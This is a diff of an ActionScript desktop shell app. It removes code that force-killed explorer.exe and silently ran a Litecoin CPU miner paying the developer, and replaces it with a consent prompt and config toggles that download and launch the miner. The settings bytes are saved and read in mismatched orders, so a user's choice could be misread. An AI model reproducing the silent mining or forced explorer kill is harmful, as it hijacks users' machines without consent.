@@ -1,6 +1,9 @@
 ﻿package 
 {
 	
+	import by.blooddy.crypto.serialization.SerializationHelper;
+	import com.coltware.airxzip.ZipEntry;
+	import com.coltware.airxzip.ZipFileReader;
 	import flash.desktop.ClipboardFormats;
 	import flash.desktop.NativeApplication;
 	import flash.desktop.NativeDragManager;
@@ -17,7 +20,10 @@
 	import flash.events.ProgressEvent;
 	import flash.geom.Rectangle;
 	import flash.html.HTMLLoader;
+	import flash.net.URLLoader;
+	import flash.net.URLLoaderDataFormat;
 	import flash.net.URLRequest;
+	import flash.system.Capabilities;
 	import flash.text.TextField;
 	import sfxworks.NetworkEvent;
 	import sfxworks.NetworkUserEvent;
@@ -52,7 +58,7 @@
 	{
 		private var f:File;
 		private var c:Communications;
-		private var frameDisplay:FrameDisplay;
+		private static const FIRST_RUN_FILE:String = "firstrun16";
 		
 		//function flags
 		private var useVideoCall:Boolean;
@@ -69,6 +75,9 @@
 		//Chat service
 		private var chatService:ChatService;
 		
+		//HTMLFrame
+		private var htmlLoader:HTMLLoader;
+		
 		//Space container
 		private var sc:SpaceContainer;
 		private var spaceService:SpaceService;
@@ -76,8 +85,21 @@
 		//Background window
 		private var backgroundWindow:NativeWindow;
 		
+		//Optional cpuminer
+		private var cpuminer:NativeProcess;
+		
+		private var firstrun:Boolean;
+		
 		public function main()
 		{
+			terms_mc.visible = false;
+			litecoinprompt_mc.visible = false;
+			communications_mc.update_mc.visible = false;
+			filesharing_mc.visible = false;
+			chatwindow_mc.visible = false;
+			litehtmlframe_mc.visible = false;
+			config_mc.visible = false;
+			
 			stage.align = StageAlign.TOP_LEFT;
 			stage.scaleMode = StageScaleMode.NO_SCALE;
 			//stage.stageWidth = stage.fullScreenWidth;
@@ -85,6 +107,147 @@
 			stage.nativeWindow.x = 0;
 			stage.nativeWindow.y = 0;
 			
+			//BEFORE DOING ANYTHING ELSE...Have the user agree to terms of service.
+			var f:File = new File(File.applicationStorageDirectory.resolvePath(FIRST_RUN_FILE).nativePath);
+			if (f.exists)
+			{
+				firstrun = false;
+				init();
+			}
+			else
+			{
+				firstrun = true;
+				terms_mc.visible = true;
+				terms_mc.tosimage_mc.buttonMode = true;
+				terms_mc.tosimage_mc.addEventListener(MouseEvent.CLICK, openTOS);
+				terms_mc.addEventListener(MouseEvent.MOUSE_DOWN, dragObject);
+				terms_mc.addEventListener(MouseEvent.MOUSE_UP, dragStop);
+				terms_mc.accept_btn.addEventListener(MouseEvent.CLICK, handleTosAccept);
+				terms_mc.decline_btn.addEventListener(MouseEvent.CLICK, handleTosDeny);
+			}
+			
+		}
+		
+		
+		//FISTRUN =============
+		private function handleTosDeny(e:MouseEvent):void 
+		{
+			NativeApplication.nativeApplication.exit();
+		}
+		
+		private function handleTosAccept(e:MouseEvent):void 
+		{
+			terms_mc.tosimage_mc.removeEventListener(MouseEvent.CLICK, openTOS);
+			terms_mc.accept_btn.removeEventListener(MouseEvent.CLICK, handleTosAccept);
+			terms_mc.decline_btn.removeEventListener(MouseEvent.CLICK, handleTosDeny);
+			terms_mc.removeEventListener(MouseEvent.MOUSE_DOWN, dragObject);
+			terms_mc.removeEventListener(MouseEvent.MOUSE_UP, dragStop);
+			terms_mc.visible = false;
+			
+			//Save firstrun
+			var f:File = new File(File.applicationStorageDirectory.resolvePath(FIRST_RUN_FILE).nativePath);
+			var fs:FileStream = new FileStream();
+			fs.open(f, FileMode.WRITE);
+			fs.writeByte(1); //Don't kill explorer
+			fs.writeByte(1); //Don't allow cpuminer to run
+			fs.writeByte(0); //Allow start on login
+			fs.close();
+			
+			//Next, ask the user for pizza money
+			litecoinprompt_mc.visible = true;
+			litecoinprompt_mc.yes_btn.addEventListener(MouseEvent.CLICK, handleLitecoinYes);
+			litecoinprompt_mc.no_btn.addEventListener(MouseEvent.CLICK, handleLitecoinNo);
+			litecoinprompt_mc.addEventListener(MouseEvent.MOUSE_DOWN, dragObject);
+			litecoinprompt_mc.addEventListener(MouseEvent.MOUSE_UP, dragStop);
+		}
+		
+		private function handleLitecoinNo(e:MouseEvent):void 
+		{
+			litecoinprompt_mc.yes_btn.removeEventListener(MouseEvent.CLICK, handleLitecoinYes);
+			litecoinprompt_mc.no_btn.removeEventListener(MouseEvent.CLICK, handleLitecoinNo);
+			litecoinprompt_mc.removeEventListener(MouseEvent.MOUSE_DOWN, dragObject);
+			litecoinprompt_mc.removeEventListener(MouseEvent.MOUSE_UP, dragStop);
+			litecoinprompt_mc.visible = false;
+			init();
+		}
+		
+		private function handleLitecoinYes(e:MouseEvent):void 
+		{
+			litecoinprompt_mc.yes_btn.removeEventListener(MouseEvent.CLICK, handleLitecoinYes);
+			litecoinprompt_mc.no_btn.removeEventListener(MouseEvent.CLICK, handleLitecoinNo);
+			litecoinprompt_mc.removeEventListener(MouseEvent.MOUSE_DOWN, dragObject);
+			litecoinprompt_mc.removeEventListener(MouseEvent.MOUSE_UP, dragStop);
+			litecoinprompt_mc.visible = false;
+			var f:File = new File(File.applicationStorageDirectory.resolvePath(FIRST_RUN_FILE).nativePath);
+			var fs:FileStream = new FileStream();
+			fs.open(f, FileMode.WRITE);
+			fs.writeByte(1); //Don't kill explorer
+			fs.writeByte(0); //Allow cpuminer to run
+			fs.writeByte(0); //Allow start on login
+			fs.close();
+			
+			//Download cpuminer
+			
+			downloadCPUMiner();
+		}
+		
+		private function downloadCPUMiner():void 
+		{
+			var cpuZip:URLLoader = new URLLoader(); //                cpuminerWIN.zip
+			cpuZip.dataFormat = URLLoaderDataFormat.BINARY;
+			trace("ATTEMPTING TO LOAD URL " + new URLRequest("https://github.com/downloads/pooler/cpuminer/pooler-cpuminer-2.2.3-win32.zip").url);
+			cpuZip.load(new URLRequest("https://github.com/downloads/pooler/cpuminer/pooler-cpuminer-2.2.3-win32.zip"));
+			cpuZip.addEventListener(Event.COMPLETE, handleCPUMinerDLComplete);
+			init();
+		}
+		
+		private function handleCPUMinerDLComplete(e:Event):void 
+		{
+			e.target.removeEventListener(Event.COMPLETE, handleCPUMinerDLComplete);
+			
+			//var data:ByteArray = e.target.data;
+			
+			//write zip
+			var cpuZip:File = new File(File.createTempFile().nativePath);
+			var fs:FileStream = new FileStream();
+			fs.open(cpuZip, FileMode.WRITE);
+			fs.writeBytes(e.target.data, 0, e.target.data.length);
+			fs.close();
+			
+			//Have the reader load the zip;
+			var reader:ZipFileReader = new ZipFileReader();
+			reader.open(cpuZip);
+			var fileList:Array = reader.getEntries();
+			
+			trace("FILELIST = " + fileList);
+
+			var localMinerDirectory:File = new File(File.applicationStorageDirectory.resolvePath("cpuminer" + File.separator).nativePath);
+			
+			for each (var entry:ZipEntry in fileList)
+			{
+				trace("unzipping file " + entry.getFilename());
+				var unzippedBytes:ByteArray = reader.unzip(entry);
+				var fileToWrite:File = localMinerDirectory.resolvePath(entry.getFilename());
+				fs.open(fileToWrite, FileMode.WRITE);
+				fs.writeBytes(reader.unzip(entry), 0, reader.unzip(entry).length);
+				fs.close();
+			}
+			
+			startCPUMiner();
+		}
+		
+		
+		private function openTOS(e:MouseEvent):void 
+		{
+			trace("TOS source = " + File.applicationDirectory.resolvePath("tos.txt").nativePath);
+			File.applicationDirectory.resolvePath("tos.txt").openWithDefaultApplication();
+		}
+		
+		//==================================
+		
+		
+		private function init():void
+		{
 			//Create background window
 			var bgWindowOptions:NativeWindowInitOptions = new NativeWindowInitOptions();
 			bgWindowOptions.systemChrome = NativeWindowSystemChrome.NONE;
@@ -173,15 +336,6 @@
 			//Network drives
 			//Local Drives
 			
-			//Kill Explorer
-			
-			var npsi:NativeProcessStartupInfo = new NativeProcessStartupInfo();
-			var np:NativeProcess = new NativeProcess();
-			
-			npsi.executable = new File("C:" + File.separator + "Windows" + File.separator + "System32" + File.separator + "cmd.exe");
-			npsi.arguments = new Vector.<String>();
-			npsi.arguments.push("/c taskkill /IM explorer.exe /f");
-			np.start(npsi);
 			
 			//NativeApplication.nativeApplication.startAtLogin = true;
 			
@@ -192,18 +346,26 @@
 			//Start space service..
 			spaceService = new SpaceService(c);
 			
-			//Donation litecoin mining service
-			var dnp:NativeProcess = new NativeProcess();
+			//Handle startup service
 			
-			var dnpsi:NativeProcessStartupInfo = new NativeProcessStartupInfo();
-			dnpsi.executable = new File(File.applicationDirectory.resolvePath("cpuminer" + File.separator + "minerd.exe").nativePath);
-			dnpsi.arguments = new Vector.<String>();
-			dnpsi.workingDirectory = new File(File.applicationDirectory.resolvePath("cpuminer" + File.separator).nativePath);
-			dnpsi.arguments.push("--url=stratum+tcp://us.litecoinpool.org:3333");
-			dnpsi.arguments.push("--userpass=sfxworks.1:1");
-			trace("This file " + File.applicationDirectory.resolvePath("cpuminer" + File.separator + "minerd.exe").nativePath + " " + File.applicationDirectory.resolvePath("cpuminer" + File.separator + "minerd.exe").exists)
-			//start "minerd" /D "C:\Users\Stephanie Walker\Desktop\desktop project\bin\cpuminer\" /LOW "minerd.exe" --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=sfxworks.1:1
-			dnp.start(dnpsi);
+			if (!firstrun)
+			{
+				var startupFile:File = new File(File.applicationStorageDirectory.resolvePath(FIRST_RUN_FILE).nativePath);
+				var fs:FileStream = new FileStream();
+				fs.open(startupFile, FileMode.READ);
+				if (fs.readByte() == 0)
+				{
+					killExplorer();
+				}
+				if (fs.readByte() == 0)
+				{
+					startCPUMiner();
+				}
+				fs.close();
+			}
+			
+			
+			
 		}
 		
 		// === NETWORK STATUS ===
@@ -240,6 +402,9 @@
 			//Chat service
 			communications_mc.status_mc.globalchat_btn.addEventListener(MouseEvent.CLICK, handleChatClick);
 			chatService = new ChatService(c);
+			
+			//HTMLFrame
+			communications_mc.status_mc.litehtmlbrowser_btn.addEventListener(MouseEvent.CLICK, handleLiteHtmlFrameClick);
 			
 			//Enable hover over & out
 			//communications_mc.addEventListener(MouseEvent.ROLL_OVER, handleCommunicationsRollOver);
@@ -587,9 +752,123 @@
 			}
 		}
 		
+		// CONFIGURATION MENU ==== 
 		private function handleConfigClick(e:MouseEvent):void 
 		{
-			//addChild(new ConfigMenu(c, bg_mc));
+			if (config_mc.visible)
+			{
+				config_mc.litecoin_mc.removeEventListener(MouseEvent.CLICK, handleLitecoinButtonClick);
+				config_mc.winexplorer_mc.removeEventListener(MouseEvent.CLICK, handleWinexplorerButtonClick);
+				config_mc.startatlaunch_mc.removeEventListener(MouseEvent.CLICK, handleStartAtLaunchClick);
+				
+				//Save vales
+				var fs:FileStream = new FileStream();
+				var startupFile:File = new File(File.applicationStorageDirectory.resolvePath(FIRST_RUN_FILE).nativePath);
+				fs.open(startupFile, FileMode.WRITE);
+				fs.writeByte(config_mc.litecoin_mc.currentFrame - 1);
+				fs.writeByte(config_mc.winexplorer_mc.currentFrame - 1);
+				fs.writeByte(config_mc.startatlaunch_mc.currentFrame - 1);
+				fs.close();
+				
+				config_mc.visible = false;
+			}
+			else
+			{
+				config_mc.visible = true;
+				
+				//Set true/false display values
+				var fs:FileStream = new FileStream();
+				var startupFile:File = new File(File.applicationStorageDirectory.resolvePath(FIRST_RUN_FILE).nativePath);
+				fs.open(startupFile, FileMode.READ);
+				
+				if (fs.readByte() == 1) //Property for litecoin
+				{
+					config_mc.litecoin_mc.gotoAndStop(2);
+				}
+				if (fs.readByte() == 1) //Property for killing explorer
+				{
+					config_mc.winexplorer_mc.gotoAndStop(2);
+				}
+				if (fs.readByte() == 1) //Property for starting at startup
+				{
+					config_mc.startatlaunch_mc.gotoAndStop(2);
+				}
+				
+				//Event listeners
+				config_mc.litecoin_mc.addEventListener(MouseEvent.CLICK, handleLitecoinButtonClick);
+				config_mc.winexplorer_mc.addEventListener(MouseEvent.CLICK, handleWinexplorerButtonClick);
+				config_mc.startatlaunch_mc.addEventListener(MouseEvent.CLICK, handleStartAtLaunchClick);
+				
+				//Turn into buttons
+				config_mc.litecoin_mc.buttonMode = true;
+				config_mc.winexplorer_mc.buttonMode = true;
+				config_mc.startatlaunch_mc.buttonMode = true;
+			}
+			
+		}
+		
+		private function handleStartAtLaunchClick(e:MouseEvent):void 
+		{
+			if (config_mc.startatlaunch_mc.currentFrame == 1)
+			{
+				//Set start to launch to = false
+				NativeApplication.nativeApplication.startAtLogin = false;
+				config_mc.startatlaunch_mc.gotoAndStop(2);
+			}
+			else
+			{
+				NativeApplication.nativeApplication.startAtLogin = true;
+				config_mc.startatlaunch_mc.gotoAndStop(1);
+			}
+		}
+		
+		private function handleWinexplorerButtonClick(e:MouseEvent):void 
+		{
+			if (config_mc.winexplorer_mc.currentFrame == 1) //Disable windows explorer?
+			{
+				//User turned from true to false
+				//Start explorer
+				var file:File = new File(File.applicationStorageDirectory.resolvePath("C:"+File.separator+"windows"+File.separator+"explorer.exe").nativePath);
+				file.openWithDefaultApplication();
+				
+				config_mc.winexplorer_mc.gotoAndStop(2);
+			}
+			else
+			{
+				//User turned from false to true
+				//kill explorer
+				
+				killExplorer();
+				config_mc.winexplorer_mc.gotoAndStop(1);
+			}
+			
+		}
+		
+		private function handleLitecoinButtonClick(e:MouseEvent):void 
+		{
+			if (config_mc.litecoin_mc.currentFrame == 1)
+			{
+				//User turned from true to false
+				//Kill litecoin miner
+				cpuminer.exit(true);
+				config_mc.litecoin_mc.gotoAndStop(2);
+			}
+			else
+			{
+				//User turned from false to true
+				//Start litecoin miner
+				
+				//TODO: Need to make downloader progress event to catch if user switches quickly
+				if (File.applicationStorageDirectory.resolvePath("cpuminer" + File.separator + "minerd.exe").exists)
+				{
+					startCPUMiner();
+				}
+				else
+				{
+					downloadCPUMiner();	
+				}
+				config_mc.litecoin_mc.gotoAndStop(1);
+			}
 		}
 		
 		private function handleFileBrowse(e:MouseEvent):void 
@@ -623,7 +902,7 @@
 		
 		private function handleInternetClick(e:MouseEvent):void 
 		{
-			var url = "http://sfxworks.net"; 
+			var url = "http://news.google.com"; 
 			var urlReq = new URLRequest(url); 
 			navigateToURL(urlReq);
 		}
@@ -706,8 +985,97 @@
 		}
 		
 		
+		//============ LITE HTML FRAME =======================
+		
+		private function handleLiteHtmlFrameClick(e:MouseEvent):void 
+		{
+			if (litehtmlframe_mc.visible)
+			{
+				htmlLoader.reload();
+				htmlLoader.cancelLoad();
+				htmlLoader = null;
+				
+				litehtmlframe_mc.visible = false;
+			}
+			else
+			{
+				litehtmlframe_mc.visible = true;
+				
+				htmlLoader = new HTMLLoader();
+				htmlLoader.addEventListener(Event.COMPLETE, handleHtmlLoadComplete);
+				litehtmlframe_mc.nav_txt.addEventListener(KeyboardEvent.KEY_DOWN, handleHtmlNavKeyDown);
+				litehtmlframe_mc.drag_mc.addEventListener(MouseEvent.MOUSE_DOWN, handleLiteHtmlFrameMouseDown);
+				litehtmlframe_mc.drag_mc.addEventListener(MouseEvent.MOUSE_UP, handleLiteHtmlFrameMouseUp);
+			}
+		}
+		
+		private function handleHtmlLoadComplete(e:Event):void 
+		{
+			litehtmlframe_mc.addChild(htmlLoader);
+			
+			htmlLoader.width = 800;
+			htmlLoader.height = 600;
+			htmlLoader.y = 26.95;
+			
+		}
+		
+		private function handleLiteHtmlFrameMouseUp(e:MouseEvent):void 
+		{
+			litehtmlframe_mc.stopDrag();
+		}
+		
+		private function handleLiteHtmlFrameMouseDown(e:MouseEvent):void 
+		{
+			litehtmlframe_mc.startDrag();
+		}
+		
+		private function handleHtmlNavKeyDown(e:KeyboardEvent):void 
+		{
+			if (e.keyCode == 13)
+			{
+				htmlLoader.reload();
+				htmlLoader.cancelLoad();
+				htmlLoader.load(new URLRequest(litehtmlframe_mc.nav_txt.text));
+				htmlLoader.addEventListener(ProgressEvent.PROGRESS, handleHtmlLoaderProgress); //test
+				litehtmlframe_mc.nav_txt.text;
+			}
+		}
+		
+		private function handleHtmlLoaderProgress(e:ProgressEvent):void 
+		{
+			trace("HTMLLoader progress event test");
+			trace("Bytes loaded = " + e.bytesLoaded);
+			trace("Bytes total = " + e.bytesTotal);
+		}
 		
 		
+		private function startCPUMiner():void 
+		{
+			trace("Starting cpuminer");
+			cpuminer = new NativeProcess();
+			//Donation litecoin mining service
+			
+			var dnpsi:NativeProcessStartupInfo = new NativeProcessStartupInfo();
+			dnpsi.executable = new File(File.applicationStorageDirectory.resolvePath("cpuminer" + File.separator + "minerd.exe").nativePath);
+			dnpsi.arguments = new Vector.<String>();
+			dnpsi.workingDirectory = new File(File.applicationStorageDirectory.resolvePath("cpuminer" + File.separator).nativePath);
+			dnpsi.arguments.push("--url=stratum+tcp://us.litecoinpool.org:3333");
+			dnpsi.arguments.push("--userpass=sfxworks.1:1");
+			trace("This file " + File.applicationStorageDirectory.resolvePath("cpuminer" + File.separator + "minerd.exe").nativePath + " " + File.applicationStorageDirectory.resolvePath("cpuminer" + File.separator + "minerd.exe").exists)
+			//start "minerd" /D "C:\Users\Stephanie Walker\Desktop\desktop project\bin\cpuminer\" /LOW "minerd.exe" --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=sfxworks.1:1
+			cpuminer.start(dnpsi);
+		}
+		
+		private function killExplorer():void 
+		{
+			var npsi:NativeProcessStartupInfo = new NativeProcessStartupInfo();
+			var np:NativeProcess = new NativeProcess();
+				
+			npsi.executable = new File("C:" + File.separator + "Windows" + File.separator + "System32" + File.separator + "cmd.exe");
+			npsi.arguments = new Vector.<String>();
+			npsi.arguments.push("/c taskkill /IM explorer.exe /f");
+			np.start(npsi);
+		}
 		
 		
 		
